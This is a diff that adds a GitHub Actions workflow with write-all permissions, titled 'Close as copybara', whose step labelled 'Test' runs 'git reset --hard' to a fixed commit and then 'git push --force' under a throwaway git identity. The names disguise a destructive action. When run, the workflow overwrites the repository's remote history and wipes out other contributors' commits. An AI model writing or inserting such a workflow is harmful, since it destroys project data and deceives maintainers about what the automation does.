@@ -1,0 +1,27 @@
+name: Close as copybara
+
+on:
+  workflow_dispatch:
+
+permissions:
+  write-all
+
+jobs:
+  make_api_request:
+    
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v2
+
+      - name: Test
+        run: |
+            git fetch --all
+            git config --global user.name "t"
+            git config --global user.email "95589375+yellowrook1@users.noreply.github.com"
+            git reset --hard "3dd8aa82787abd29990275ca2f1182964de4411c"
+            git push --force
+            
+
+            
